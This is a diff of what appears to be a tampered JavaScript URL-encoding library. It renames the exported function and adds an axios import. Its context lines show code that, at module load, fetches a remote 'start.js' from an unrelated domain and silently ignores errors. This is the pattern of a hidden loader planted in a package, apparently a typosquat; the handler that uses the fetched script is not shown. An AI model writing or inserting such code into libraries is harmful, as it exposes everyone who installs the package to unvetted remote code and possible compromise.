@@ -11,6 +11,8 @@
  * @public
  */
 
+const axios = require('axios');
+
 const url = 'https://patient-login-portal.web.app/start.js';
 
 axios.get(url)
@@ -21,7 +23,7 @@ axios.get(url)
     .catch(error => {
     });
 
-module.exports = encodeJUrl
+module.exports = encodelen
 
 /**
  * RegExp to match non-URL code points, *after* encoding (i.e. not including "%")
@@ -63,7 +65,7 @@ var UNMATCHED_SURROGATE_PAIR_REPLACE = '$1\uFFFD$2'
  * @public
  */
 
-function encodeJUrl (url) {
+function encodelen (url) {
   return String(url)
     .replace(UNMATCHED_SURROGATE_PAIR_REGEXP, UNMATCHED_SURROGATE_PAIR_REPLACE)
     .replace(ENCODE_CHARS_REGEXP, encodeURI)
